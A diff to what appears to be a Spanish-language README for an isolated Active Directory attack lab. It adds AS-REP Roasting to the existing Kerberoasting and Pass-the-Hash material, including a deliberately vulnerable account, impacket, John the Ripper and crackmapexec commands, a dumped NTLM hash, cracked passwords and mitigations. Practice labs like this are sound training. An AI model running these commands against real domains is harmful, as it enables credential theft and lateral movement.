@@ -60,6 +60,7 @@ Montado íntegramente en local con VMware Workstation — entorno 100% aislado, 
 | mjohnson | Summer2023! | Usuario estándar | Contraseña débil |
 | svc-sql | MYpassword123# | Service Account | **Kerberoastable** (SPN registrado) |
 | localadmin | P@ssw0rd123! | Domain Admin | **Pass-the-Hash** |
+| asrepuser | Welcome1! | Usuario estándar | **AS-REP Roastable** (pre-auth desactivada) |
  
 ---
  
@@ -131,6 +132,13 @@ New-ADUser -Name "Local Admin" -SamAccountName "localadmin" -UserPrincipalName "
   -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
   -Enabled $true -PasswordNeverExpires $true
 Add-ADGroupMember -Identity "Admins. del dominio" -Members "localadmin"
+ 
+# Usuario sin pre-autenticación Kerberos — vulnerable a AS-REP Roasting
+New-ADUser -Name "AS Rep User" -SamAccountName "asrepuser" -UserPrincipalName "asrepuser@lab.local" `
+  -Path "OU=Lab Users,DC=lab,DC=local" `
+  -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) `
+  -Enabled $true -PasswordNeverExpires $true
+Set-ADAccountControl -Identity "asrepuser" -DoesNotRequirePreAuth $true
 ```
  
 **Verificación:**
@@ -267,9 +275,9 @@ nslookup lab.local 192.168.100.10
 |---|---|---|
 | Kerberoasting | Impacket GetUserSPNs + John the Ripper | ✅ Completado |
 | Pass-the-Hash | Impacket secretsdump + CrackMapExec | ✅ Completado |
+| AS-REP Roasting | Impacket GetNPUsers + John the Ripper | ✅ Completado |
+| DCSync | Impacket secretsdump | 🔄 En progreso |
 | Enumeración AD | BloodHound + bloodhound-python | 📋 Pendiente |
-| AS-REP Roasting | Impacket GetNPUsers | 📋 Pendiente |
-| DCSync | Impacket secretsdump | 📋 Pendiente |
  
 ---
  
@@ -277,12 +285,7 @@ nslookup lab.local 192.168.100.10
  
 ### ¿Qué es?
  
-Kerberoasting explota el protocolo Kerberos para obtener tickets de servicio (TGS) cifrados con la contraseña de cuentas que tienen un SPN registrado. Cualquier usuario del dominio puede solicitar estos tickets y crackerarlos offline sin generar alertas en el DC.
- 
-### Requisitos
- 
-- Un usuario válido del dominio (cualquiera)
-- Una cuenta de servicio con SPN registrado (`svc-sql` en este lab)
+Kerberoasting explota el protocolo Kerberos para obtener tickets de servicio (TGS) cifrados con la contraseña de cuentas que tienen un SPN registrado. Cualquier usuario del dominio puede solicitar estos tickets y crackearlos offline sin generar alertas en el DC.
  
 ### Ejecución
  
@@ -302,12 +305,12 @@ john --format=krb5tgs \
 ### Resultado
  
 ```
-Contraseña crackeada → svc-sql : MYpassword123#
+svc-sql : MYpassword123#
 ```
  
 **Verificación:**
  
-![Kerberoasting hash obtenido](./docs/screenshots/fase4-04-kerberoasting-hash.png)
+![Kerberoasting hash](./docs/screenshots/fase4-04-kerberoasting-hash.png)
 
 *TGS de svc-sql obtenido con credenciales de usuario estándar*
  
@@ -318,8 +321,8 @@ Contraseña crackeada → svc-sql : MYpassword123#
 ### Mitigación
  
 - Contraseñas de más de 25 caracteres en todas las service accounts
-- Usar **Group Managed Service Accounts (gMSA)** — contraseñas rotadas automáticamente por el DC
-- Auditar regularmente cuentas con SPN: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`
+- Usar **Group Managed Service Accounts (gMSA)**
+- Auditar cuentas con SPN: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`
  
 ---
  
@@ -327,12 +330,7 @@ Contraseña crackeada → svc-sql : MYpassword123#
  
 ### ¿Qué es?
  
-Pass-the-Hash (PtH) aprovecha que Windows autentica usuarios mediante su hash NTLM — no necesita la contraseña en texto claro. Si obtienes el hash de un usuario con privilegios, puedes autenticarte como él en cualquier máquina del dominio sin conocer su contraseña.
- 
-### Requisitos
- 
-- Credenciales de un usuario con privilegios de administrador local en el DC
-- Acceso SMB al objetivo
+Pass-the-Hash aprovecha que Windows autentica usuarios mediante su hash NTLM. Si obtienes el hash de un usuario privilegiado, puedes autenticarte como él en cualquier máquina del dominio sin conocer su contraseña en texto claro.
  
 ### Ejecución
  
@@ -340,10 +338,10 @@ Pass-the-Hash (PtH) aprovecha que Windows autentica usuarios mediante su hash NT
 # Paso 1 — Extraer hashes NTLM del DC
 impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10
  
-# Hash NTLM extraído de localadmin:
+# Hash NTLM de localadmin:
 # localadmin:1106:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
  
-# Paso 2 — Autenticarse con el hash sin necesidad de contraseña
+# Paso 2 — Autenticarse con el hash sin contraseña
 crackmapexec smb 192.168.100.0/24 \
   -u localadmin \
   -H 7dfa0531d73101ca080c7379a9bff1c7
@@ -370,7 +368,73 @@ crackmapexec smb 192.168.100.0/24 \
 - Deshabilitar NTLM donde sea posible y forzar Kerberos
 - Activar **Windows Defender Credential Guard**
 - Implementar **Protected Users Security Group** para cuentas privilegiadas
-- Principio de mínimo privilegio — no reutilizar contraseñas entre cuentas admin
+ 
+---
+ 
+## 👻 AS-REP Roasting
+ 
+### ¿Qué es?
+ 
+AS-REP Roasting ataca cuentas que tienen desactivada la pre-autenticación Kerberos. Sin esta verificación, cualquiera puede solicitar un ticket cifrado con la contraseña del usuario y crackearlo offline — sin necesitar ninguna credencial válida del dominio.
+ 
+### Ejecución
+ 
+```powershell
+# En el DC — crear usuario vulnerable
+New-ADUser -Name "AS Rep User" -SamAccountName "asrepuser" `
+  -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) `
+  -Enabled $true
+Set-ADAccountControl -Identity "asrepuser" -DoesNotRequirePreAuth $true
+```
+ 
+```bash
+# Desde Kali — obtener hash sin credenciales
+impacket-GetNPUsers lab.local/asrepuser \
+  -dc-ip 192.168.100.10 \
+  -no-pass \
+  -format john \
+  -outputfile asrep.hash
+ 
+# Crackear
+john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+ 
+### Resultado
+ 
+```
+asrepuser : Welcome1!
+```
+ 
+**Verificación:**
+ 
+![AS-REP user configurado](./docs/screenshots/fase5-01-asrep-user.png)
+
+*DoesNotRequirePreAuth habilitado en asrepuser*
+ 
+![AS-REP hash obtenido](./docs/screenshots/fase5-02-asrep-hash.png)
+
+*Hash obtenido sin ninguna credencial del dominio*
+ 
+![AS-REP crackeado](./docs/screenshots/fase5-03-asrep-cracked.png)
+
+*Welcome1! crackeado con John the Ripper*
+ 
+### Mitigación
+ 
+- Forzar pre-autenticación Kerberos en todos los usuarios
+- Auditar cuentas vulnerables: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`
+ 
+---
+ 
+## 💀 DCSync
+ 
+> 🔄 *En progreso*
+ 
+---
+ 
+## 🔍 Enumeración con BloodHound
+ 
+> 📋 *Pendiente*
  
 ---
  
@@ -380,9 +444,9 @@ crackmapexec smb 192.168.100.0/24 \
 |---|---|
 | Kerberoasting | Contraseñas +25 caracteres en service accounts · Usar gMSA |
 | Pass-the-Hash | Deshabilitar NTLM · Activar Credential Guard · Protected Users |
-| BloodHound / Enumeración | Principio de mínimo privilegio · Auditar ACLs del dominio |
-| AS-REP Roasting | Forzar pre-autenticación Kerberos en todos los usuarios |
+| AS-REP Roasting | Forzar pre-autenticación Kerberos · Auditar cuentas periódicamente |
 | DCSync | Restringir permisos de replicación (solo DCs reales) |
+| BloodHound / Enumeración | Principio de mínimo privilegio · Auditar ACLs del dominio |
  
 ---
  
